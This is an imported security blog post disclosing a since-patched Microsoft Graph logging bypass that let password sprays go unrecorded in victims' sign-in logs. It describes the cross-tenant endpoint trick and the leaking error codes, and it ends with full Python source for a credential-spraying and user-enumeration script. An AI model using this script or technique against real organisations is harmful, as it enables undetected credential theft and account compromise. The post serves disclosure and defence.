---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-04-29_full-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-grap.md
original_filename: 2024-04-29_full-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-grap.md
title: 'Full Disclosure: A Look at a Recently Patched Microsoft Graph Logging Bypass
  - GraphNinja'
category: documents
detected_topics:
- oauth
- sso
- idor
- command-injection
- mfa
- otp
tags:
- imported
- documents
- oauth
- sso
- idor
- command-injection
- mfa
- otp
language: en
raw_sha256: 08f73cd7135edebe5daa08d31bd87511a61026011999afa8c0b766a373c3a79a
text_sha256: 31b8712809caceaf9552c75c2c1d564fe4b55b5f4d6607493b39ab11cd523fd0
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: false
---

# Full Disclosure: A Look at a Recently Patched Microsoft Graph Logging Bypass - GraphNinja

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-04-29_full-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-grap.md
- Source Type: markdown
- Detected Topics: oauth, sso, idor, command-injection, mfa, otp
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: False
- Raw SHA256: `08f73cd7135edebe5daa08d31bd87511a61026011999afa8c0b766a373c3a79a`
- Text SHA256: `31b8712809caceaf9552c75c2c1d564fe4b55b5f4d6607493b39ab11cd523fd0`


## Content

---
title: "Full Disclosure: A Look at a Recently Patched Microsoft Graph Logging Bypass - GraphNinja"
page_title: "TrustedSec | Full Disclosure: A Look at a Recently Patched Microsoft…"
url: "https://trustedsec.com/blog/full-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja"
final_url: "https://trustedsec.com/blog/full-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja"
authors: ["nyxgeek (@nyxgeek)"]
programs: ["Microsoft (Microsoft Graph)"]
bugs: ["Password spraying", "Broken authentication"]
publication_date: "2024-04-29"
added_date: "2024-05-08"
source: "pentester.land/writeups.json"
original_index: 315
---

* [Blog](https://trustedsec.com/blog)
  * [Full Disclosure: A Look at a Recently Patched Microsoft Graph Logging Bypass - GraphNinja](https://trustedsec.com/blog/full-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja)

April 29, 2024

# Full Disclosure: A Look at a Recently Patched Microsoft Graph Logging Bypass - GraphNinja

Written by @ nyxgeek 

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/MicrosoftGraphBypass_WebHero.jpg?w=320&h=320&q=90&auto=format&fit=crop&dm=1767064367&s=6c3991351ff9242e1016b0b3dd7bf3c8)

Share

  * [Share URL]( "Share URL")
  * [Share via Email](/cdn-cgi/l/email-protection#e2dd91978088878196dfa18a878189c7d0d28d9796c7d0d2968a8b91c7d0d28390968b818e87c7d0d284908d8fc7d0d2b6909791968786b18781c7d0d3c4838f92d9808d869bdfa4978e8ec7d0d2a68b91818e8d91979087c7d1a3c7d0d2a3c7d0d2ae8d8d89c7d0d28396c7d0d283c7d0d2b08781878c968e9bc7d0d2b28396818a8786c7d0d2af8b81908d918d8496c7d0d2a59083928ac7d0d2ae8d85858b8c85c7d0d2a09b92839191c7d0d2cfc7d0d2a59083928aac8b8c8883c7d1a3c7d0d28a96969291c7d1a3c7d0a4c7d0a496909791968786918781cc818d8fc7d0a4808e8d85c7d0a484978e8ecf868b91818e8d91979087cf83cf8e8d8d89cf8396cf83cf908781878c968e9bcf928396818a8786cf8f8b81908d918d8496cf859083928acf8e8d85858b8c85cf809b92839191cf859083928a8c8b8c8883 "Share via Email")
  * [Share on Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Ffull-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja "Share on Facebook")
  * [Share on X](https://twitter.com/share?text=Full%20Disclosure%3A%20A%20Look%20at%20a%20Recently%20Patched%20Microsoft%20Graph%20Logging%20Bypass%20-%20GraphNinja%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Ffull-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja "Share on X")
  * [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Ffull-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja&mini=true "Share on LinkedIn")

From June 2023 to March 2024, Microsoft Graph was vulnerable to a logging bypass that allowed attackers to perform password-spray attacks undetected. During this period, any organization in Azure could have been attacked and would have had no indication of the activity. While this issue was identified in 2023, the exact time of its emergence remains unclear.

The bypass was straightforward: by changing the authentication endpoint for Microsoft Graph to that of an unrelated tenant, logon attempts would not appear in the victim's logs. However, verbose error messages would still reveal the validity of User Principal Names (UPNs) and passwords.

To be fair – while this vulnerability did enable attackers to silently identify valid credentials, they would then still need to use traditional logon methods that would appear in logs.

Microsoft did not issue a CVE for this vulnerability, considering it a 'Low severity issue'. Internally, it was assigned VULN-107279 and the associated ticket was officially closed on March 11, 2024.

## Overview

Microsoft Graph provides different endpoints to authenticate to, depending on if your application is a single-tenant application or multi-tenant application. Normal Graph logons target the 'common' endpoint used by multi-tenant apps. This 'common' endpoint then takes care of figuring out which tenant to send the authentication to. By changing the endpoint of a Microsoft Graph authentication attempt from 'common' to any tenant ID besides that of the organization you were spraying, you could evade logging with password-sprays.

Instead of authenticating against the normal 'common' endpoint:

` https://login.microsoftonline.com/common/oauth2/token`

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/fig1_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393951&s=e881f3bd383c5469d11495a31c3b3ff2)

you change it to this:

`https://login.microsoftonline.com/{tenant}/oauth2/token`

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig2_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393952&s=e2a9c6272889493df5cdd6021ca19a3f)

Where {tenant} is any tenant ID that is not related to the organization where you are performing a password-spray. 

That's it! User enumeration and logon indication worked just fine this way. Actual logon was not successful, as it was authenticating to another tenant, but the response still indicated if it was a valid or invalid password. The only difference in the Graph response is that a valid password would be denoted by an error code of [AADSTS700016](https://learn.microsoft.com/en-us/answers/questions/692461/message-aadsts700016-application-with-identifier-n) instead of the traditional AADSTS50126 or AADSTS50079 responses.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig3_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393953&s=9dea7f598560b121007e3eb63b49ccc5)

By specifying the foreign tenant ID, this logon attempt would not show up in the victim's sign-in logs. If you used the target organization's actual tenant ID, the logons WOULD show up (as you are authing to their actual tenant directly). As long as the {tenant} used was any other tenant ID than your target org, it WOULD NOT show up in the sign-in logs.

## Proof-of-Concept or GTFO

For this demo, I will use two scripts: **graph_logon.py** (Normal graph logon), and **graphninja.py** (Secret silent method that will not show in logs). The source code [can be found here ](https://github.com/nyxgeek/graphninja)or at the end of this blog.

**_Remember: THIS ISSUE HAS BEEN FIXED AND NO LONGER WORKS._**

1\. First, a login attempt using normal graph logon (**graph_logon.py**) method was attempted on August 15th, 2023 at 01:38:40 UTC. We can see that it identified a valid username via the response code.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig4_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393954&s=63c34eb4969e5e8a70932b96e4e103f4)

2\. Checking our logs, we can see a failed logged in attempt was identified for a valid user. Log shows August 15th, 2023 at 8:38:41 local time timestamp, which matches our UTC timestamp **graph_logon.py**.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig5_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393956&s=7ff81de997c9781651d6827f64ae23dd)

3\. Next, we will perform another logon attempt, but using the **graphninja** method. For sake of clarity, this attempt was made from a different host with a different external IP, so that there will be no ambiguity in any logs if this attempt were to show up. (I've also performed an invalid username attempt just to demonstrate it is possible to differentiate valid vs invalid users, as in all Graph logon attempts.)

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig6_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393957&s=4b7e539ab69bb0aec4357fbfe38e729e)

4\. If we check our logs again, we see there are no new failed login attempt since the pervious attempt with the standard **graph_logon.py**. Our **graphninja** attempt has not appeared.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig7_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393958&s=d5acf2bd7b69a7814889db0948368278)

5\. Two more logons were attempted with **graph_logon.py**. Note that the date of this log is AFTER the date of our **graphninja.py** attempt (August 15th, 2023 at 01:45:52 and 01:48:04 UTC).

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig8_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393959&s=c569141f93f8cca8706a07e8b15a978c)

6\. Checking logs again shows no failed login attempts while using **graphninja** from the other host. You can see additional logs flowing in, but no failures logged via our **graphninja** method.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig9_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393961&s=ab1254504c2f95b463799145048aae1b)

7\. Use **graphninja** with a valid username and valid password shows that it is possible to verify valid credentials with this method. Since we are authenticating against another tenant's endpoint, authentication cannot complete successfully, but the verbose error codes still indicate that the password is valid.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig10_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393962&s=a5b0b07bb5b87b90415e3667555b035f)

8\. Checking logs again. Still no sign of any login attempts – valid, or invalid – from **graphninja**.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig11_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393963&s=7ceb969b5cb14a4597090ff673180ab8)

9\. Finally, we'll perform another standard **graph_logon** test to validate that logs are still flowing.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig12_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393965&s=7e7bb0d84f1e9ecef20e2c792a9d7d81)

10\. Checking the logs shows the latest failed authenticaiton from graph_logon.py. We can see that all logs are flowing, with various login attempts minutes apart showing up from **graph_logon** (standard graph authentication) but still no attempts were shown from **graphninja** with the alternate endpoint set.

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/FullDisclosure_nyxgeek/Fig13_Burkeland.png?w=320&q=90&auto=format&fit=max&dm=1714393967&s=0c564322d4feec13a6e3bd5f7319c62c)

## Background and How it Works

Why does this work? I'm not 100% sure, but here's what I believe was happening:

  1. Entra ID only logs failed and successful attempts for VALID users.
  2. For authentication attempts to the 'common' endpoint, these are either forwarded to an account's logging, or perhaps each tenant queries from the common log regularly. At any rate, this seems to be based on the domain name in the UPN.
  3. For authentication attempts to a particular tenant, these would forward or log directly to the target tenant's account logging.
  4. For authentication attempts to a particular tenant where your user does not exist, trying to log in with an external username ([[email protected]](/cdn-cgi/l/email-protection) from the Acme Computer Company tenant authenticating to TrustedSec's tenant) would not be a valid user on the target tenant, and so the attempt would not be logged.
  5. Due to verbose Graph error codes (The same ones that make user enumeration possible), it is possible to see if the username is valid or invalid, and also whether the password is valid or invalid.

So, this logging bypass is done by authenticating against an individual tenant oauth2 endpoint vs the 'common' endpoint. I believe that the reason that this does not show up in logs is because the log viewer is only showing failed logins for VALID accounts FROM common endpoints and their own tenant.

I discovered this bypass while I was reviewing an old project for guest enumeration that I had been working on back in 2021. I had not known about Dr AzureAD's work on guest enumeration at that time, and had been testing out different potential methods of guest enumeration via Graph.

In my test scripts for the enumeration attempts, I had changed the tenant ID to that of the 'host' organization. It was while reviewing these scripts and testing them again with verbose output (Lots of print statements) that I realized these cross-tenant authentication attempts weren't being logged. So, unless Microsoft changed something drastically with this in the last few years, it seemed that I had accidentally stumbled upon this back in 2021 but didn't realize it at the time. It very likely could have existed since the dawn of Azure. It's so simple I'd be surprised if it isn't being used in the wild.

## Reflections

This is something that affected all organizations in Azure directly. Being blind to an attack means you are unable to react. User enumeration, especially invisible user enumeration is bad. Password-spraying, especially invisible password-spraying, is way worse.

Now, bear in mind, Smart Lockout was still a compensating control; however, by varying the source IP addresses regularly, it would be possible to bypass this and determine if the credential set is valid. Once known, the attacker could then attempt to log in normally from a more familiar location. 

I am unsure of whether or not this was actually used in the wild; however, with the simplicity of it, I would be surprised if I were the only one to discover it. The fact that something like this could potentially have existed for some time may help solve some mysterious intrusions where the source of a stolen credential was not known. 

Microsoft Security Response Center rated this as a "low" severity issue. At the time of writing this, I have not seen any mention of the issue published anywhere on their site. It appears that they are not going to tell their customers that they have all been blind to password attacks for a long time. Should customers be warned about the existence of these now-patched vulnerabilities?

MSRC gets a lot of flak. They have good people, but perhaps insufficient pull with influencing developers, or insufficient staffing. At any rate, I believe that the current model of relying upon the goodwill of hackers is insufficient when it comes to the security of a large cloud provider. If I were a blackhat, I'm not sure that I would have given up this gem for any standard bounty amount. The bounties simply cannot be relied upon in the case of really juicy finds.

Use MFA. Use conditional access. Use hard-to-enumerate username formats. Separate email addresses from UPNs. Most importantly, ask Microsoft to take user enumeration seriously, as it is intertwined with the root of this problem.

## Source Code:
  
  
  #!/usr/bin/env python3
  #
  # GRAPH NINJA
  #
  # Logless password spraying
  #
  # THREAT LEVEL: MIDNIGHT
  #
  # 2023.06.26 @nyxgeek – TrustedSec
  # Originally discovered but not realized October 2021
  #
  # Shoutout to o365enum where I snarfed some of this from https://github.com/gremwell/o365enum/
  
  import requests
  import argparse
  
  # Define command-line arguments
  parser = argparse.ArgumentParser(description='Log into Microsoft Graph.')
  parser.add_argument("-u", "--username", help="user to target", metavar='')
  parser.add_argument("-U", "--userfile", help="file containing usernames in email format", metavar='')
  parser.add_argument("-p", "--password", help='Password for the Microsoft account.')
  args = parser.parse_args()
  
  def login(username, password):
  headers = {
  "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro",
  "Accept": "application/json",
  }
  body = {
  "resource": "https://graph.windows.net",
  "client_id": "72f988bf-86f1-41af-91ab-2d7cd011db42",
  "client_info": '1',
  "grant_type": "password",
  "username": username,
  "password": password,
  "scope": "openid"
  }
  codes = {
  0: ['AADSTS50034'], # INVALID
  1: ['AADSTS50126'], # VALID
  3: ['AADSTS50079', 'AADSTS50076'], # MSMFA
  4: ['AADSTS50158'], # OTHER MFA
  5: ['AADSTS50053'], # LOCKED
  6: ['AADSTS50057'], # DISABLED
  7: ['AADSTS50055'], # EXPIRED
  8: ['AADSTS50128', 'AADSTS50059'], # INVALID TENANT
  9: ['AADSTS700016'] # VALID USER/PASS
  }
  
  state = -1
  #this is contoso tenant ID
  response = requests.post("https://login.microsoftonline.com/6babcaad-604b-40ac-a9d7-9fd97c0b779f/oauth2/token", headers=headers, data=body)
  
  # States
  # 0 = invalid user
  # 1 = valid user
  # 2 = valid user/pass
  # 3 = MS MFA response
  # 4 = third-party MFA?
  # 5 = locked out
  # 6 = acc disabled
  # 7 = pwd expired
  # 8 = invalid tenant response
  # 9 = valid user/pass
  if response.status_code == 200:
  state = 2
  else:
  respErr = response.json()['error_description']
  for k, v in codes.items():
  if any(e in respErr for e in v):
  state = k
  break
  if state == -1:
  #logging.info(f"UNKERR: {respErr}")
  print(f"UNKERR: {respErr}")
  
  #print(response.cookies.get_dict())
  return state
  
  if args.username:
  
  # Call the login function
  status = login(args.username, args.password)
  if status == 9:
  english_status = "VALID ACCOUNT CREDS"
  elif status == 1:
  english_status = "VALID USERNAME"
  elif status == 5:
  english_status = "LOCKED / SMART LOCKOUT"
  elif status == 6:
  english_status = "DISABLED"
  elif status == 7:
  english_status = "EXPIRED - UPDATE PASSWORD"
  else:
  english_status = "INVALID"
  #single user lookup
  print(f'{args.username}:{args.password} - Status: {english_status}')
  
  
  
  if args.userfile:
  
  # Read the file with the usernames
  with open(args.userfile, 'r') as f:
  usernames = f.read().splitlines()
  
  # Call the login function for each username
  for username in usernames:
  status = login(username, args.password)
  
  if status == 9:
  english_status = "VALID ACCOUNT CREDS"
  elif status == 1:
  english_status = "VALID USERNAME"
  elif status == 5:
  english_status = "LOCKED / SMART LOCKOUT"
  elif status == 6:
  english_status = "DISABLED"
  elif status == 7:
  english_status = "EXPIRED - UPDATE PASSWORD"
  else:
  english_status = "INVALID"
  
  print(f'{username}:{args.password} - Status: {english_status}')

Share

  * [Share URL]( "Share URL")
  * [Share via Email](/cdn-cgi/l/email-protection#b18ec2c4d3dbd4d2c58cf2d9d4d2da948381dec4c5948381c5d9d8c2948381d0c3c5d8d2ddd4948381d7c3dedc948381e5c3c4c2c5d4d5e2d4d294838097d0dcc18ad3ded5c88cf7c4dddd948381f5d8c2d2dddec2c4c3d49482f0948381f0948381fddededa948381d0c5948381d0948381e3d4d2d4dfc5ddc8948381e1d0c5d2d9d4d5948381fcd8d2c3dec2ded7c5948381f6c3d0c1d9948381fdded6d6d8dfd6948381f3c8c1d0c2c29483819c948381f6c3d0c1d9ffd8dfdbd09482f0948381d9c5c5c1c29482f09483f79483f7c5c3c4c2c5d4d5c2d4d29fd2dedc9483f7d3ddded69483f7d7c4dddd9cd5d8c2d2dddec2c4c3d49cd09cdddededa9cd0c59cd09cc3d4d2d4dfc5ddc89cc1d0c5d2d9d4d59cdcd8d2c3dec2ded7c59cd6c3d0c1d99cddded6d6d8dfd69cd3c8c1d0c2c29cd6c3d0c1d9dfd8dfdbd0 "Share via Email")
  * [Share on Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Ffull-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja "Share on Facebook")
  * [Share on X](https://twitter.com/share?text=Full%20Disclosure%3A%20A%20Look%20at%20a%20Recently%20Patched%20Microsoft%20Graph%20Logging%20Bypass%20-%20GraphNinja%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Ffull-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja "Share on X")
  * [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Ffull-disclosure-a-look-at-a-recently-patched-microsoft-graph-logging-bypass-graphninja&mini=true "Share on LinkedIn")
